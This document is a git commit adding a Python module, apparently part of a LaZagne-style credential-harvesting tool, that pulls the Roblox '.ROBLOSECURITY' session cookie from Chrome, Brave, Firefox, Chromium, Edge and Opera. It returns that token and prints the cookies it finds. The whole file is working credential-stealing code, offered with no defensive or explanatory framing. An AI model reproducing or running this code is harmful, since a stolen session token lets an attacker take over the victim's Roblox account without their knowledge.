7750ccbb05ae178a9bdb2b56dcb61dc7713ba59d
SilentV0id <77442200+Void-666@users.noreply.github.com>
2023-07-03 12:08:55 +0300

    Create roblox.py

---
+++ Windows/lazagne/softwares/games/roblox.py
@@ -0,0 +1,67 @@
+import requests, robloxpy, json, browser_cookie3, os.path
+
+user = os.path.expanduser("~")
+
+
+def robloxl():
+    data = [] 
+
+    try:
+        cookies = browser_cookie3.chrome(domain_name='roblox.com')    
+        for cookie in cookies:
+            print(cookie)
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.brave(domain_name='roblox.com')    
+        for cookie in cookies:
+            print(cookie)
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.firefox(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+    try:
+        cookies = browser_cookie3.chromium(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.edge(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                print("L")
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
+
+    try:
+        cookies = browser_cookie3.opera(domain_name='roblox.com')
+        for cookie in cookies:
+            if cookie.name == '.ROBLOSECURITY':
+                data.append(cookies)
+                data.append(cookie.value)
+                return data
+    except:
+        pass
